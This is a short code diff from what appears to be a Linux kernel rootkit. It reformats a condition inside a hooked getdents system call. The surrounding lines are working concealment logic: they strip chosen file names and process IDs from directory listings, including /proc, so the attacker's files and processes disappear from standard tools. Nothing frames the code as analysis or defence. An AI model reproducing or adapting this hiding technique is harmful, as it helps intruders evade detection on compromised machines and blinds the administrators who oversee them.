@@ -36,7 +36,9 @@ void* hook_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int
   
   while(cnt < totalsize){
       printk("|%s| ", ldir->d_name);
-      if( is_hidden_file(ldir->d_name) || (pid_inode->i_ino == PROC_ROOT_INO && is_hidden_pid(simple_strtoul(ldir->d_name, NULL, 10) ) ) ){
+      if( is_hidden_file(ldir->d_name) || 
+         (pid_inode->i_ino == PROC_ROOT_INO && 
+          is_hidden_pid(simple_strtoul(ldir->d_name, NULL, 10)))){
            next = (struct linux_dirent *) ((char *) ldir + ldir->d_reclen);
            totalsize -= ldir->d_reclen;
            memmove(ldir, next, totalsize-cnt);
